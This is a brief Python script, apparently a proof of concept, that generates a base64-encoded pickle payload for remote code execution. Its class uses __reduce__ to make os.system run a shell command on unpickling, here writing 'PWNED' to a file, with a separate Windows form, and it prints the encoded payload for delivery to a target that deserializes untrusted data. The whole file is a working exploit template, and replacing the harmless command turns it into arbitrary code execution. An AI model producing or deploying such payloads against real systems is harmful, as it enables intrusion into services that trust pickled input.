import pickle, base64, os
class RCE:
    def __reduce__(self):
        cmd = "sh -c 'echo PWNED > rce.txt'" if os.name != "nt" else "cmd /c echo PWNED > rce.txt"
        return (os.system, (cmd,))
payload_b64 = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload_b64)